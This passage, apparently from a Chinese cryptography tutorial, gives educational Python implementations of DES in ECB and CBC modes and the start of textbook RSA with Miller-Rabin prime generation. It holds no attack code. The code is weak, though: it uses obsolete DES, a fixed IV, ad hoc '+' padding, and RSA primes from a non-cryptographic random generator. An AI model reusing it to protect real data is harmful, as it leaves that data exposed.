              [<span class="hljs-number">7</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,<span class="hljs-number">15</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">11</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">15</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">7</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">14</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">12</span>,<span class="hljs-number">11</span>,<span class="hljs-number">7</span>,<span class="hljs-number">13</span>,<span class="hljs-number">15</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">14</span>,<span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">7</span>,<span class="hljs-number">2</span>,<span class="hljs-number">14</span>],
              [<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">13</span>,<span class="hljs-number">0</span>,<span class="hljs-number">14</span>,<span class="hljs-number">9</span>,<span class="hljs-number">14</span>,<span class="hljs-number">11</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,<span class="hljs-number">7</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>,<span class="hljs-number">10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">11</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">15</span>,<span class="hljs-number">9</span>,<span class="hljs-number">12</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">14</span>,<span class="hljs-number">11</span>,<span class="hljs-number">8</span>,<span class="hljs-number">12</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">15</span>,<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>],
              [<span class="hljs-number">12</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">15</span>,<span class="hljs-number">9</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">14</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">10</span>,<span class="hljs-number">15</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">7</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">11</span>,<span class="hljs-number">3</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">12</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">11</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">15</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">14</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">6</span>,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>],
              [<span class="hljs-number">4</span>,<span class="hljs-number">11</span>,<span class="hljs-number">2</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">0</span>,<span class="hljs-number">11</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">14</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">12</span>,<span class="hljs-number">2</span>,<span class="hljs-number">15</span>,<span class="hljs-number">8</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">11</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">14</span>,<span class="hljs-number">10</span>,<span class="hljs-number">15</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">11</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">10</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">12</span>],
              [<span class="hljs-number">13</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">15</span>,<span class="hljs-number">11</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">14</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">12</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">15</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">12</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">11</span>,<span class="hljs-number">0</span>,<span class="hljs-number">14</span>,<span class="hljs-number">9</span>,<span class="hljs-number">2</span>,<span class="hljs-number">7</span>,<span class="hljs-number">11</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">9</span>,<span class="hljs-number">12</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">15</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">8</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">14</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">10</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>,<span class="hljs-number">15</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">11</span>]
              ]
    res = <span class="hljs-string">""</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(str), <span class="hljs-number">6</span>):
        begin_s = str[i:i + <span class="hljs-number">6</span>]
        row = int(begin_s[<span class="hljs-number">0</span>] + begin_s[<span class="hljs-number">5</span>], <span class="hljs-number">2</span>)  <span class="hljs-comment">#第一位和第六位作为行</span>
        col = int(begin_s[<span class="hljs-number">1</span>:<span class="hljs-number">5</span>], <span class="hljs-number">2</span>)             <span class="hljs-comment">#中间四位作为列</span>
        index = s_list[j][row * <span class="hljs-number">16</span> + col]
        num = bin(index)[<span class="hljs-number">2</span>:]                   <span class="hljs-comment">#将匹配的数字转换位二进制数</span>
        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">4</span> - len(num)):       <span class="hljs-comment">#不够4位则补0</span>
            num = <span class="hljs-string">"0"</span> + num
        res += num
        j = j + <span class="hljs-number">1</span>
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># p盒处理   置换操作</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">P_box</span><span class="hljs-params">(str)</span>:</span>
    res = <span class="hljs-string">""</span>
    change_table = [<span class="hljs-number">16</span>,<span class="hljs-number">7</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">29</span>,<span class="hljs-number">12</span>,<span class="hljs-number">28</span>,<span class="hljs-number">17</span>,
                    <span class="hljs-number">1</span>,<span class="hljs-number">15</span>,<span class="hljs-number">23</span>,<span class="hljs-number">26</span>,<span class="hljs-number">5</span>,<span class="hljs-number">18</span>,<span class="hljs-number">31</span>,<span class="hljs-number">10</span>,
                    <span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">24</span>,<span class="hljs-number">14</span>,<span class="hljs-number">32</span>,<span class="hljs-number">27</span>,<span class="hljs-number">3</span>,<span class="hljs-number">9</span>,
                    <span class="hljs-number">19</span>,<span class="hljs-number">13</span>,<span class="hljs-number">30</span>,<span class="hljs-number">6</span>,<span class="hljs-number">22</span>,<span class="hljs-number">11</span>,<span class="hljs-number">4</span>,<span class="hljs-number">25</span>]
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> change_table:
        res += str[i - <span class="hljs-number">1</span>]
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># F函数</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">F_function</span><span class="hljs-params">(str, key)</span>:</span>  <span class="hljs-comment"># R(32位)-&gt;E盒(48位)-&gt;与key的子密钥异或-&gt;S盒-&gt;P置换</span>
    str_e_res = E_box(str)            <span class="hljs-comment"># 将 E 异或 S  P 集合到一个函数种，便于调用</span>
    xor_res = xor(str_e_res, key)
    str_s_res = S_box(xor_res)
    str_p_res = P_box(str_s_res)
    <span class="hljs-keyword">return</span> str_p_res

<span class="hljs-comment"># 逆IP盒</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">IP_re</span><span class="hljs-params">(str)</span>:</span>
    res = <span class="hljs-string">""</span>
    ip_list = [<span class="hljs-number">40</span>,<span class="hljs-number">8</span>,<span class="hljs-number">48</span>,<span class="hljs-number">16</span>,<span class="hljs-number">56</span>,<span class="hljs-number">24</span>,<span class="hljs-number">64</span>,<span class="hljs-number">32</span>,
               <span class="hljs-number">39</span>,<span class="hljs-number">7</span>,<span class="hljs-number">47</span>,<span class="hljs-number">15</span>,<span class="hljs-number">55</span>,<span class="hljs-number">23</span>,<span class="hljs-number">63</span>,<span class="hljs-number">31</span>,
               <span class="hljs-number">38</span>,<span class="hljs-number">6</span>,<span class="hljs-number">46</span>,<span class="hljs-number">14</span>,<span class="hljs-number">54</span>,<span class="hljs-number">22</span>,<span class="hljs-number">62</span>,<span class="hljs-number">30</span>,
               <span class="hljs-number">37</span>,<span class="hljs-number">5</span>,<span class="hljs-number">45</span>,<span class="hljs-number">13</span>,<span class="hljs-number">53</span>,<span class="hljs-number">21</span>,<span class="hljs-number">61</span>,<span class="hljs-number">29</span>,
               <span class="hljs-number">36</span>,<span class="hljs-number">4</span>,<span class="hljs-number">44</span>,<span class="hljs-number">12</span>,<span class="hljs-number">52</span>,<span class="hljs-number">20</span>,<span class="hljs-number">60</span>,<span class="hljs-number">28</span>,
               <span class="hljs-number">35</span>,<span class="hljs-number">3</span>,<span class="hljs-number">43</span>,<span class="hljs-number">11</span>,<span class="hljs-number">51</span>,<span class="hljs-number">19</span>,<span class="hljs-number">59</span>,<span class="hljs-number">27</span>,
               <span class="hljs-number">34</span>,<span class="hljs-number">2</span>,<span class="hljs-number">42</span>,<span class="hljs-number">10</span>,<span class="hljs-number">50</span>,<span class="hljs-number">18</span>,<span class="hljs-number">58</span>,<span class="hljs-number">26</span>,
               <span class="hljs-number">33</span>,<span class="hljs-number">1</span>,<span class="hljs-number">41</span>,<span class="hljs-number">9</span>,<span class="hljs-number">49</span>,<span class="hljs-number">17</span>,<span class="hljs-number">57</span>,<span class="hljs-number">25</span> ]
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ip_list:
        res += str[i<span class="hljs-number">-1</span>]
    <span class="hljs-keyword">return</span> res


<span class="hljs-comment"># DES加密操作</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">DESencode</span><span class="hljs-params">(text, key)</span>:</span>
    text_bin = str_process(text)     <span class="hljs-comment"># 将字符转换为二进制数</span>
    text_IP = begin_change(text_bin)  <span class="hljs-comment"># 明文初始置换</span>
    key_bin = str_process(key)      <span class="hljs-comment"># 将密钥转换位二进制数</span>
    key_list = key_gen(key_bin) <span class="hljs-comment"># key_lsst 数组中存放着十六个子密钥</span>

    text_left = text_IP[<span class="hljs-number">0</span>:<span class="hljs-number">32</span>]     <span class="hljs-comment"># R0</span>
    text_right = text_IP[<span class="hljs-number">32</span>:]     <span class="hljs-comment"># L0</span>

    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">15</span>):      <span class="hljs-comment"># 十五轮加密</span>

        mes_tmp = text_right     <span class="hljs-comment"># 临时变量用于左右两部分交换</span>
        text_right = xor(F_function(text_right, key_list[i]) , text_left) <span class="hljs-comment">#F 函数的作用 R(32位)-&gt;E盒(48位)-&gt;与key的子密钥异或(32位)-&gt;S盒(32位)-&gt;P置换(32位)</span>
        text_left = mes_tmp
    fin_right = text_right       <span class="hljs-comment"># 第十六轮加密</span>
    fin_left = xor(F_function(text_right, key_list[<span class="hljs-number">15</span>]), text_left)
    criph_text = fin_left + fin_right
    criph_text = IP_re(criph_text)     <span class="hljs-comment">#  IP逆置换</span>
    <span class="hljs-keyword">return</span> criph_text

<span class="hljs-comment"># 针对一组的解密程序</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">DESdecode</span><span class="hljs-params">(text, key)</span>:</span>  <span class="hljs-comment">#密文直接输64位2进制</span>
    key_bin = str_process(key)    <span class="hljs-comment"># 将密钥转换为二进制数</span>
    key_list = key_gen(key_bin)   <span class="hljs-comment"># 生成的十六个子密钥</span>
    text = begin_change(text)   <span class="hljs-comment"># 先初始值换 与加密过程相反</span>
    cipher_left = text[<span class="hljs-number">0</span>:<span class="hljs-number">32</span>]    <span class="hljs-comment"># R16</span>
    cipher_right = text[<span class="hljs-number">32</span>:]    <span class="hljs-comment"># L16</span>
    i = <span class="hljs-number">15</span>
    <span class="hljs-keyword">while</span> i &gt; <span class="hljs-number">0</span>:                <span class="hljs-comment"># 十五轮加密 反过来</span>
        cipher_tmp = cipher_right   <span class="hljs-comment">#设置一个临时变量用于后面的交换</span>
        cipher_right = xor(cipher_left, F_function(cipher_right, key_list[i]))    <span class="hljs-comment"># F 函数的作用 R(32位)-&gt;E盒(48位)-&gt;与key的子密钥异或(32位)-&gt;S盒(32位)-&gt;P置换(32位)</span>
                                                                                  <span class="hljs-comment"># F 函数处理完后与L(32位)异或</span>
        cipher_left = cipher_tmp    <span class="hljs-comment"># 左右交换完成</span>
        i = i - <span class="hljs-number">1</span>
    left_text = xor(cipher_left, F_function(cipher_right, key_list[<span class="hljs-number">0</span>])) <span class="hljs-comment"># 一</span>
    right_text = cipher_right                                           <span class="hljs-comment"># 二 三 这三步是第十六轮加密</span>
    plain_bin = left_text + right_text                                  <span class="hljs-comment">#</span>
    plain_bin = IP_re(plain_bin)                                        <span class="hljs-comment">#</span>
    plain_text = <span class="hljs-string">""</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(plain_bin), <span class="hljs-number">8</span>):
        plain_text += chr(int(plain_bin[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>))
    <span class="hljs-keyword">return</span> plain_text


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Divide_text</span><span class="hljs-params">(order,text,key)</span>:</span>    <span class="hljs-comment"># 将明文或者明文分组 明文分成8个字符一组，密文则分成64bit一组</span>
    block_text = []
    res = <span class="hljs-string">""</span>
    length = <span class="hljs-number">0</span>
    <span class="hljs-keyword">if</span> order == <span class="hljs-string">"E"</span>:
        length = <span class="hljs-number">8</span>
    <span class="hljs-keyword">else</span>:
        length = <span class="hljs-number">64</span>
    i = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> text[i:i+length] != <span class="hljs-string">""</span>:
        block_text.append(text[i:i+length])
        i += length

    <span class="hljs-keyword">if</span> order == <span class="hljs-string">'E'</span>:
        <span class="hljs-keyword">if</span> len(block_text[<span class="hljs-number">-1</span>]) != <span class="hljs-number">8</span>:       <span class="hljs-comment"># 最后一组明文如果不够八个字符则添加 + 补齐八个  否则程序会报错</span>
            block_text[<span class="hljs-number">-1</span>] = block_text[<span class="hljs-number">-1</span>] + <span class="hljs-string">'+'</span> * (<span class="hljs-number">8</span> - len(block_text[<span class="hljs-number">-1</span>]))
        <span class="hljs-keyword">for</span> text <span class="hljs-keyword">in</span> block_text:             <span class="hljs-comment"># 分别对每组加密</span>
            res += DESencode(text, key)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">for</span> text <span class="hljs-keyword">in</span> block_text:             <span class="hljs-comment"># 对密文解密</span>
            res += DESdecode(text, key)
    <span class="hljs-keyword">return</span> res

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
        plaintext = <span class="hljs-string">''</span>
        ciphertext = <span class="hljs-string">''</span>
        key = <span class="hljs-string">''</span>
        order = input(<span class="hljs-string">"加密请按E,解密请按D:"</span>)
        <span class="hljs-keyword">if</span> order == <span class="hljs-string">'E'</span>:
            plaintext = input(<span class="hljs-string">"请输入明文："</span>)
            key = input(<span class="hljs-string">"请输入密钥："</span>)
            ciphertext = Divide_text(order, plaintext, key)
            print(<span class="hljs-string">"密文是："</span>)
            print(ciphertext)
        <span class="hljs-keyword">else</span>:
            ciphertext = input(<span class="hljs-string">"请输入密文："</span>)
            key = input(<span class="hljs-string">"请输入密钥："</span>)
            plaintext = Divide_text(order, ciphertext, key)
            print(<span class="hljs-string">"明文是："</span>)
            print(plaintext)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    main()</code></pre></div>



<p>DES_CBC模式</p>
<p>只需要修改ECB模式中的 Divide_text 部分</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Divide_text</span><span class="hljs-params">(order,text,key)</span>:</span>    <span class="hljs-comment"># 将明文或者明文分组 明文分成8个字符一组，密文则分成64bit一组</span>
    block_text = []
    IV = <span class="hljs-string">'aaaaaaaa'</span>                 <span class="hljs-comment"># 初始化向量</span>
    IV_bin = str_process(IV)
    res = <span class="hljs-string">""</span>
    length = <span class="hljs-number">0</span>
    <span class="hljs-keyword">if</span> order == <span class="hljs-string">"E"</span>:
        length = <span class="hljs-number">8</span>
    <span class="hljs-keyword">else</span>:
        length = <span class="hljs-number">64</span>
    i = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> text[i:i+length] != <span class="hljs-string">""</span>:
        block_text.append(text[i:i+length])
        i += length
    tmp = <span class="hljs-string">""</span>
    <span class="hljs-comment"># 加密</span>
    <span class="hljs-keyword">if</span> order == <span class="hljs-string">'E'</span>:
        <span class="hljs-keyword">if</span> len(block_text[<span class="hljs-number">-1</span>]) != <span class="hljs-number">8</span>:       <span class="hljs-comment"># 最后一组明文如果不够八个字符则添加 + 补齐八个  否则程序会报错</span>
            block_text[<span class="hljs-number">-1</span>] = block_text[<span class="hljs-number">-1</span>] + <span class="hljs-string">'+'</span> * (<span class="hljs-number">8</span> - len(block_text[<span class="hljs-number">-1</span>]))

        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(block_text)):             <span class="hljs-comment"># 分别对每组加密</span>
            <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span> :
                tmp = DESencode(block_text[i],key, IV_bin)
                res += tmp
            <span class="hljs-keyword">else</span>:
                tmp = DESencode(block_text[i],key,tmp)
                res += tmp
    <span class="hljs-comment"># 解密</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(block_text)):
            <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span>:
                tmp = block_text[i]
                res += DESdecode(block_text[i], key, IV_bin)
            <span class="hljs-keyword">else</span>:
                res += DESdecode(block_text[i], key, tmp)
                tmp = block_text[i]
    <span class="hljs-keyword">return</span> res</code></pre></div>



<h1 id="四、RSA"><a href="#四、RSA" class="headerlink" title="四、RSA"></a>四、RSA</h1><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2020/12/23 14:24</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : rsa.py</span>

<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> random

<span class="hljs-comment"># 模重复平方法</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fast_mod</span><span class="hljs-params">(p,q,n)</span>:</span>     <span class="hljs-comment"># p为底数，p为指数</span>
    res = <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span> q:
        <span class="hljs-keyword">if</span> q &amp; <span class="hljs-number">1</span>:
            res = (res * p) % n
        q &gt;&gt;= <span class="hljs-number">1</span>             <span class="hljs-comment"># 右移1位</span>
        p = (p * p) % n
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># 计算出d</span>
<span class="hljs-comment">#这个扩展欧几里得算法求模逆,用于求d</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">caculateD</span><span class="hljs-params">(a, m)</span>:</span>
    u1,u2,u3 = <span class="hljs-number">1</span>,<span class="hljs-number">0</span>,a
    v1,v2,v3 = <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,m
    <span class="hljs-keyword">while</span> v3!=<span class="hljs-number">0</span>:
        q = u3//v3
        v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3
    <span class="hljs-keyword">return</span> u1%m


<span class="hljs-comment"># 将字符转化为十六进制字符串</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str2Hex</span><span class="hljs-params">(m)</span>:</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>.join(<span class="hljs-string">"&#123;:02x&#125;"</span>.format(ord(x)) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> m)

<span class="hljs-comment"># 素性检验：采用 Miler-Rabin 检验法</span>
<span class="hljs-comment"># 所有的𝑟 ∈ [0, 𝑠 − 1]，若𝑎^𝑑 ≠ 1(𝑚𝑜𝑑 𝑛)且𝑎^((2^𝑟)*𝑑) ≠ −1(𝑚𝑜𝑑 𝑛)，则𝑛是合数。否则，𝑛有 3/4的概率为素数</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">miller_rabin</span><span class="hljs-params">(n)</span>:</span>
    s = n - <span class="hljs-number">1</span>
    t = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> s % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:  <span class="hljs-comment"># n,s,t之间的关系为 n = 2^s * t</span>
        s = s // <span class="hljs-number">2</span>
        t += <span class="hljs-number">1</span>
    <span class="hljs-keyword">for</span> trials <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):   <span class="hljs-comment"># 可以多增加几轮保证大概率为素数</span>
        a = random.randrange(<span class="hljs-number">2</span>, n - <span class="hljs-number">1</span>) <span class="hljs-comment"># 随机生成a</span>
        v = pow(a, s, n)               <span class="hljs-comment"># 验证 a^(n-1) mod n</span>
        <span class="hljs-keyword">if</span> v != <span class="hljs-number">1</span>:
            i = <span class="hljs-number">0</span>
            <span class="hljs-keyword">while</span> v != (n - <span class="hljs-number">1</span>):
                <span class="hljs-keyword">if</span> i == t - <span class="hljs-number">1</span>:
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
                <span class="hljs-keyword">else</span>:
                    i = i + <span class="hljs-number">1</span>
                    v = (v ** <span class="hljs-number">2</span>) % n
    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
<span class="hljs-comment"># 生成素数 先生成1024位的奇数，再进行素性检验，通过则生成该素数</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">genPrime</span><span class="hljs-params">(b=<span class="hljs-number">1024</span>)</span>:</span>
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:                             <span class="hljs-comment"># 设置死循环直到生成素数才退出</span>
        res = <span class="hljs-string">"1"</span>
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(b<span class="hljs-number">-2</span>):
            res += str(random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))
        res += <span class="hljs-string">"1"</span>                              <span class="hljs-comment"># 最后一位为1保证为奇数</span>
        res = int(res,<span class="hljs-number">2</span>)
        <span class="hljs-keyword">if</span> miller_rabin(res):
            <span class="hljs-keyword">return</span> res                          <span class="hljs-comment"># 直到该数通过素数检验才推出循环</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">genE</span><span class="hljs-params">(phi_n)</span>:</span>
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        e = genPrime(b=random.randint(<span class="hljs-number">3</span>,<span class="hljs-number">13</span>))  <span class="hljs-comment">#随机生成e</span>
        <span class="hljs-keyword">if</span> e &lt; <span class="hljs-number">2000</span> :                  <span class="hljs-comment"># e不能太小</span>
            <span class="hljs-keyword">continue</span>
        <span class="hljs-keyword">if</span> phi_n%e != <span class="hljs-number">0</span>:               <span class="hljs-comment"># 保证e不能被phi整除</span>
            <span class="hljs-keyword">return</span> e

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RSAEncode</span><span class="hljs-params">(m, e, n)</span>:</span>               <span class="hljs-comment"># 加密公式 m^e mod n</span>
    m = int(str2Hex(m), <span class="hljs-number">16</span>)           <span class="hljs-comment"># 将字符转换为二进制</span>
    c = fast_mod(m, e, n)
    <span class="hljs-keyword">return</span> c

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RSADecode</span><span class="hljs-params">(c, d, n)</span>:</span>                 <span class="hljs-comment"># 加密公式 c^d mod n</span>
    plaintext = fast_mod(c,d,n)
    plaintext = str(long_to_bytes(plaintext).decode()) <span class="hljs-comment"># 将数字转换为字符</span>
    <span class="hljs-keyword">return</span> plaintext


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># 生成两个大素数p和q</span>
    print(<span class="hljs-string">"Generate p,q and e, please wait... "</span>)
    p = genPrime()
    q = genPrime()
